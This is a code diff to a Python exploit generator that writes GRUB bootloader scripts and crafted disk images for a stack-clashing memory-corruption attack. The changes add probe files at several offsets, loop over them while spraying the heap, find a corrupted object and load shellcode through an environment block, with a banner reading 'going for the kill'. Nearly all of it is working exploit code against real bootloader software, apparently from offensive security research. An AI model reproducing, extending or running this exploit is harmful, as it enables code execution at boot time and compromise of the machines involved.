@@ -22,42 +22,60 @@ class Primitive:
     The stack clashing primitive.
     """
 
-    def __init__(self, name, body, max_depth=MAX_DEPTH, debug=False):
+    def __init__(self, name, body, offset_start=32, max_depth=MAX_DEPTH,
+                 debug=False):
         self._max_depth = max_depth
         self._debug = debug
         self._rf = RecursiveFuncs(f'trigger_{name}')
         self._name = name
         self._filename = name
-        self._body = probe_body(body)
-        assert len(self._body) == BLOCK_SIZE
+        self._bodies = [
+            probe_body(body, offset_start + i)
+            for i in range(0, len(body), 8)
+        ]
+
+    def count(self):
+        return len(self._bodies)
 
     def setup(self, basepath):
-        # using it twice to give us a second chance with the protective mbr +
-        # final gpt volume.
-        blocks = stack(self._max_depth, self._body, self._body)
-        # padding with one block so we don't trigger the bug automatically with
-        # an `ls`
-        res = b'b' * BLOCK_SIZE
-        res += b''.join(map(bytes, blocks))
-        with open(f'{basepath}/{self._filename}', 'wb') as f:
-            f.write(res)
+        for idx, body in enumerate(self._bodies):
+            # using it twice to give us a second chance with the protective mbr
+            # + final gpt volume.
+            blocks = stack(self._max_depth, body, body)
+            # padding with one block so we don't trigger the bug automatically
+            # with an `ls`
+            res = b'b' * BLOCK_SIZE
+            res += b''.join(map(bytes, blocks))
+
+            with open(f'{basepath}/{self._filename}_{idx}', 'wb') as f:
+                f.write(res)
 
     def setup_cfg(self):
         res = []
-        # maybe we'll need multiple probe files with different offsets?
-        res += command(f'loopback {self._name} /x/{self._filename}')
         res += self._rf.setup()
         res += self._rf.define(
             [
-                f'loopback probe ({self._name})$1+',
+                'loopback probe (${base})$1+',
                 'search --file does_not_exist',
-                'loopback -d probe'
+                'loopback -d probe',
             ]
         )
         return res
 
+    def set_active(self, body_offset):
+        res = []
+        res += command(f'set base={self._name}_{body_offset}')
+        res += command('loopback ${base} /x/${base}')
+        return res
+
+    def unset_active(self):
+        res = []
+        res += command('loopback -d ${base}')
+        res += command('unset base')
+        return res
+
     def destroy(self):
-        return [f'loopback -d {self._name}']
+        return [f'loopback -d {self._name}-{i}' for i in range(self.count())]
 
     def map_depth(self, depth):
         assert depth <= self._max_depth
@@ -92,6 +110,8 @@ def clashgpt(basepath):
     assert hashval('curr') != 0
     assert hashval('template') != 0
     assert hashval('found') != 0
+    assert hashval('offset') != 0
+    assert hashval('base') != 0
 
     # envblocks give a nice way of introducing our shellcode into memory.
     envblock = env_block({'template': SHELLCODE + b'\n'})
@@ -121,7 +141,7 @@ def clashgpt(basepath):
     trigger = []
     trigger += grub_print(BANNER)
     trigger += grub_print('[!] setup')
-    trigger += find_root('/x/base', 'root')
+    trigger += find_root('/x/trigger.cfg', 'root')
     # initial setup things
     trigger += command('load_env -f /x/e.dat template')
 
@@ -141,6 +161,8 @@ def clashgpt(basepath):
     for i in range(SPRAY_CONSTRUCTION):
         trigger += vs.define(f'con_{i}')
 
+    # just use the first one, we just want to see if anything is corrupted.
+    trigger += probe.set_active(0)
     trigger += probe.trigger(PROBE_DEPTH)
     # now determine which one we corrupted.
     for i in range(SPRAY_CONSTRUCTION):
@@ -157,17 +179,21 @@ def clashgpt(basepath):
     # so then we can free it and get an object we fully control here.
     # wrapping this in a while loop so we can break from it early.
     internal = []
-    for depth in range(START_DEPTH, END_DEPTH):
-        for fun in range(FUN_COUNT):
+    for offset in range(probe.count()):
+        internal += command(f'set offset={offset}')
+        internal += probe.set_active('${offset}')
+        for depth in range(START_DEPTH, END_DEPTH):
             internal += command(f'set depth_={probe.map_depth(depth)}')
-            internal += command(f'set fun={fun:04}')
-            internal += probe.trigger(depth, fun)
-            internal += command('eval "set curr=\\$${end}"')
-            # internal += command('echo ${curr}')
-            internal += command(
-                f'if [ "${{curr}}" = {teststr} ]; then set found=true ; break ; fi'
-            )
-            # see if we have got the probe value we want into the variable.
+            for fun in range(FUN_COUNT):
+                internal += command(f'set fun={fun:04}')
+                internal += probe.trigger(depth, fun)
+                internal += command('eval "set curr=\\$${end}"')
+                # internal += command('echo ${curr}')
+                internal += command(
+                    f'if [ "${{curr}}" = {teststr} ]; then set found=true ; break ; fi'
+                )
+        probe.unset_active()
+
     internal += ['break']
 
     trigger += while_loop('1 = 1', internal)
@@ -175,6 +201,8 @@ def clashgpt(basepath):
     # from this point on we need to be very careful about variable names, as
     # introducing a fake grub_env_var will make some inaccessible.
     internal = []
+    internal += probe.unset_active()
+    internal += control.set_active('${offset}')
     internal += command('echo [!] Found: ${depth_} ${fun} ${curr}')
     internal += grub_print('[!] going for the kill')
     internal += command('unset ${end}')
